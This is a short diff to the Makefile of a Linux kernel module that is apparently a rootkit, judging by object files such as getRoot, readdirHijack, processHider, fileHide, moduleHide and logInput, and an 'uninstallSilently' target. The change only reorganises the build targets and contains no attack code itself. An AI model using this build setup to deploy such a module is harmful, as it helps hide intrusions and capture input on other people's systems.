@@ -13,6 +13,7 @@
 moduleName = blank
 obj-m += $(moduleName).o
 blank-objs += getRoot.o hideProcEntry.o communication.o readdirHijack.o processHider.o processHiderPidManipulation.o main.o fileHide.o moduleHide.o logInput.o common.o communicationOutput.o buffer/buffer.o 
+outputFileName=$(moduleName).ko
 
 #TODO: fix location buffer is build - Ensure "buffer/makefile"  does not generate a conflicting ".o" file
 
@@ -36,10 +37,12 @@ uninstallSilently:
 # 	mkdir "deployment" -p
 # 	cp deploymentTemplate/*.sh blank.ko  "deployment/"
 
-all: #environmentSpecificOptions.h
+all: outputFileName
 	mkdir "deployment" -p
-	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(BUILDDIR) modules
 	cp deploymentTemplate/*.sh blank.ko "deployment/"
+	
+outputFileName:
+	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(BUILDDIR) modules
 	
 clean:
 	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(BUILDDIR) clean
